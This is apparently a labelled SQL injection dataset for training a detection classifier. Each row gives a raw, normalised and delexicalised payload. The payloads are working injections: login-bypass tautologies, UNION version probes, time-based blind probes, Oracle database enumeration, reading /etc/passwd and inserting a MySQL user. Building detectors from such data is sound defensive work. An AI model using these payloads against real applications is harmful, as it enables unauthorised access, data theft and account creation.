payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1","select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or $+<<NUM> union select <NUM>,@@VERSION -- <NUM>",1,True,,sqli_dataset
or 'unusual'   =   'unusual',or 'unusual' = 'unusual',or <STR> = <STR>,1,False,,sqli_dataset
or 1 in   (  select @@version  )  --,or 1 in ( select @@version ) --,or <NUM> in ( select @@version ) --,1,False,,sqli_dataset
truncate,truncate,truncate,1,False,,sqli_dataset
 or 3  =  3 --, or 3 = 3 --, or <NUM> = <NUM> --,1,False,,sqli_dataset
"select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1","select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> ||<NUM> union select <NUM>,banner from v$version where rownum = <NUM> -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1","select * from users where id = 1 <@$$ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> <@$$ union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
"admin""  )   or   (  ""1""  =  ""1","admin"" ) or ( ""1"" = ""1",<TABLE><STR><NUM><STR><NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1","select * from users where id = 1 or 1#""@ union select 'a',version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""@ union select <STR>,version ( ) -- <NUM>",1,False,,sqli_dataset
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #","1 ) or benchmark ( 10000000,MD5 ( 1 ) ) #","<NUM> ) or benchmark ( <NUM>,MD5 ( <NUM> ) ) #",1,False,,sqli_dataset
"select * from users where id  =  1 union select .1_,version  (    )   -- 1","select * from users where id = 1 union select .1_,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select .1_,version ( ) -- <NUM>",1,False,,sqli_dataset
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND 'i' = 'i,AND <NUM> = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND <STR> = 'i,1,False,,sqli_dataset
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,select * from users where id = 1 %$ 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> %$ <NUM> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,select * from users where id = 1 %!<@ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> %!<@ or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --","; if not ( substring ( ( select @@version ) ,25,1 ) <> 0 ) waitfor delay '0:0:2' --","; if not ( substring ( ( select @@version ) ,<NUM>,<NUM> ) <> <NUM> ) waitfor delay <STR> --",1,False,,sqli_dataset
1  )   or sleep  (  __TIME__  )  #,1 ) or sleep ( __TIME__ ) #,<NUM> ) or sleep ( __TIME__ ) #,1,False,,sqli_dataset
"select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1","select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 <1## union select 1,version  (    )   -- 1","select * from users where id = 1 <1## union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> <<NUM>## union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1","select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> + $+*\ union select null,@@VERSION -- <NUM>",1,True,,sqli_dataset
select * from users where id  =  1. <@ or 1  =  1 -- 1,select * from users where id = 1. <@ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM>. <@ or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
or true--,or true--,or true--,1,False,,sqli_dataset
; execute immediate 'sel' || 'ect us' || 'er',; execute immediate 'sel' || 'ect us' || 'er',; execute immediate <STR> || <STR> || <STR>,1,False,,sqli_dataset
hi' or 'x'  =  'x';,hi' or 'x' = 'x';,hi<STR>x<STR>x';,1,False,,sqli_dataset
select * from users where id  =  1 <@ or 1  =  1 -- 1,select * from users where id = 1 <@ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> <@ or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or "".,"" or 1  =  1 -- 1","select * from users where id = 1 or "".,"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
admin' #,admin' #,<TABLE>' #,1,False,,sqli_dataset
"select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1","select * from users where id = 1 <@$_ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> <@$_ union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1","select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or "",{"" or 1  =  1 -- 1","select * from users where id = 1 or "",{"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;","union select 1,load_file ( '/etc/passwd' ) ,1,1,1;","union select <NUM>,load_file ( <STR> ) ,<NUM>,<NUM>,<NUM>;",1,False,,sqli_dataset
"""  )  ;waitfor delay '0:0:__TIME__'--",""" ) ;waitfor delay '0:0:__TIME__'--",""" ) ;waitfor delay <STR>--",1,False,,sqli_dataset
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )","insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', password ( 'pass123' ) )","insert into mysql.user ( user, host, <COL> ) values ( <STR>, <STR>, <COL> ( <STR> ) )",1,False,,sqli_dataset
"admin"" or ""1""  =  ""1""/*","admin"" or ""1"" = ""1""/*","<TABLE><STR><NUM><STR><NUM>""/*",1,False,,sqli_dataset
"select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1","select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> = <NUM> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1","select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or \<<NUM> union select <NUM>,@@VERSION -- <NUM>",1,False,,sqli_dataset
like,like,like,1,False,,sqli_dataset
or username like char  (  37  )  ;,or username like char ( 37 ) ;,or <COL> like char ( <NUM> ) ;,1,False,,sqli_dataset
)    )    or pg_sleep  (  __TIME__  )  --,) ) or pg_sleep ( __TIME__ ) --,) ) or pg_sleep ( __TIME__ ) --,1,False,,sqli_dataset
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,select * from users where id = 1 or $+<\ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or $+<\ or <NUM> = <NUM> -- <NUM>,1,True,,sqli_dataset
or 3  =  3,or 3 = 3,or <NUM> = <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1","select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,select * from users where id = 1 or ( $+ ) = 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or ( $+ ) = <NUM> or <NUM> = <NUM> -- <NUM>,1,True,,sqli_dataset
exec sp,exec sp,exec sp,1,False,,sqli_dataset
"select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1","select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or \+<$ union select <NUM>,@@VERSION -- <NUM>",1,True,,sqli_dataset
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,select * from users where id = 1 or \<$ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or \<$ or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1","select * from users where id = 1.&&1 union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM>.&&<NUM> union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
admin' or 1  =  1/*,admin' or 1 = 1/*,<TABLE>' or <NUM> = <NUM>/*,1,False,,sqli_dataset
a' waitfor delay '0:0:10'--,a' waitfor delay '0:0:10'--,a<STR><NUM>:<NUM>:<NUM>'--,1,False,,sqli_dataset
"select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1","select * from users where id = 1 + ( \ ) union select null,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> + ( \ ) union select null,@@VERSION -- <NUM>",1,True,,sqli_dataset
"select * from users where id  =  1 union select .1$_,version  (    )   -- 1","select * from users where id = 1 union select .1$_,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select .<NUM>$_,version ( ) -- <NUM>",1,False,,sqli_dataset
and 1 in   (  select var from temp  )  --,and 1 in ( select var from temp ) --,and <NUM> in ( select var from temp ) --,1,False,,sqli_dataset
hi'  )   or   (  'a'  =  'a,hi' ) or ( 'a' = 'a,hi<STR>a<STR>a,1,False,,sqli_dataset
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 1 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset
"admin"" or 1  =  1","admin"" or 1 = 1","<TABLE>"" or <NUM> = <NUM>",1,False,,sqli_dataset
"""  )   or true--",""" ) or true--",""" ) or true--",1,False,,sqli_dataset
"select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'","select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or $ . = <NUM> union select <NUM>,@@VERSION -- <NUM>'",1,False,,sqli_dataset
"select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1","select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
1  )   or pg_sleep  (  __TIME__  )  --,1 ) or pg_sleep ( __TIME__ ) --,<NUM> ) or pg_sleep ( __TIME__ ) --,1,False,,sqli_dataset
"select * from users where id  =  1 or ""{."" or 1  =  1 -- 1","select * from users where id = 1 or ""{."" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"""  )   or sleep  (  __TIME__  )    =  """,""" ) or sleep ( __TIME__ ) = """,<STR>,1,False,,sqli_dataset
select * from users where id  =  1.<@. or 1  =  1 -- 1,select * from users where id = 1.<@. or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM>.<@. or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"admin""  )   or   (  ""1""  =  ""1""--","admin"" ) or ( ""1"" = ""1""--","<TABLE><STR><NUM><STR><NUM>""--",1,False,,sqli_dataset
"select * from users where id  =  1<@.. union select 1,version  (    )   -- 1","select * from users where id = 1<@.. union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM><@.. union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
; exec xp_regread,; exec xp_regread,; exec xp_regread,1,False,,sqli_dataset
"select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'","select * from users where id = '1' + @ 1 union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> + @ <NUM> union select <NUM>,version ( ) -- <NUM>'",1,True,,sqli_dataset
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,select * from users where id = 1 + \+%1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> + \+%<NUM> or <NUM> = <NUM> -- <NUM>,1,True,,sqli_dataset
"select * from users where id  =  1 or "";1"" or 1  =  1 -- 1","select * from users where id = 1 or "";1"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1","select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
1 and 1  =  1,1 and 1 = 1,<NUM> and <NUM> = <NUM>,1,False,,sqli_dataset
or 0  =  0 #,or 0 = 0 #,or <NUM> = <NUM> #,1,False,,sqli_dataset
union select * from users where login   =   char ...,union select * from users where login = char ...,union select * from <TABLE> where <TABLE> = char ...,1,False,,sqli_dataset
"select * from users where id  =  1 union select 1||@,version  (    )   -- 1","select * from users where id = 1 union select 1||@,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select <NUM>||@,version ( ) -- <NUM>",1,False,,sqli_dataset
admin'  )   or '1'  =  '1'--,admin' ) or '1' = '1'--,<TABLE><STR><NUM><STR><NUM>'--,1,False,,sqli_dataset
1;SELECT *,1;SELECT *,<NUM>;SELECT *,1,False,,sqli_dataset
"select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1","select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,x' and 1 = ( select count ( * ) from tabname ) ; --,x' and <NUM> = ( select count ( * ) from tabname ) ; --,1,False,,sqli_dataset
"select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'","select * from users where id = '1' or """"<@ union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or <STR><@ union select <NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset
"select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1","select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'","select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'","select * from <TABLE> where <COL> = <STR> ||<NUM> union select <NUM>,banner from v$version where rownum = <NUM> -- <NUM>'",1,False,,sqli_dataset
"1 or benchmark  (  10000000,MD5  (  1   )    )   #","1 or benchmark ( 10000000,MD5 ( 1 ) ) #","<NUM> or benchmark ( <NUM>,MD5 ( <NUM> ) ) #",1,False,,sqli_dataset
procedure,procedure,procedure,1,False,,sqli_dataset
or ''  =  ',or '' = ',or <STR> = ',1,False,,sqli_dataset
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'i' = 'i,AND <NUM> = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND <STR> = 'i,1,False,,sqli_dataset
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 2 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( <COL> ) FROM ( SELECT DISTINCT ( <COL> ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset
\'; desc users; --,\'; desc users; --,\'; desc <TABLE>; --,1,False,,sqli_dataset
"select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1","select * from users where id = 1 or ( \. ) = 1 union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or ( \. ) = <NUM> union select <NUM>,@@VERSION -- <NUM>",1,False,,sqli_dataset
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> or $ <NUM> = <NUM> or <NUM> = <NUM> -- <NUM>',1,False,,sqli_dataset
""" or """"^""",""" or """"^""",<STR><STR>,1,False,,sqli_dataset
"""-""","""-""",<STR>,1,False,,sqli_dataset
"select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1","select * from users where id = 1 or \< = 1 union select 1,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> or \< = <NUM> union select <NUM>,@@VERSION -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 union select 1<@$,version  (    )   -- 1","select * from users where id = 1 union select 1<@$,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select <NUM><@$,version ( ) -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 *\ union select null,@@VERSION -- 1","select * from users where id = 1 *\ union select null,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> *\ union select null,@@VERSION -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'","select * from users where id = '1' or !<@ union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or !<@ union select <NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset
"select * from users where id  =  1 or "".%"" or 1  =  1 -- 1","select * from users where id = 1 or "".%"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
admin'/*,admin'/*,<TABLE>'/*,1,False,,sqli_dataset
"select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1","select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
||UTL_HTTP.REQUEST,||UTL_HTTP.REQUEST,||UTL_HTTP.REQUEST,1,False,,sqli_dataset
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 1 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset
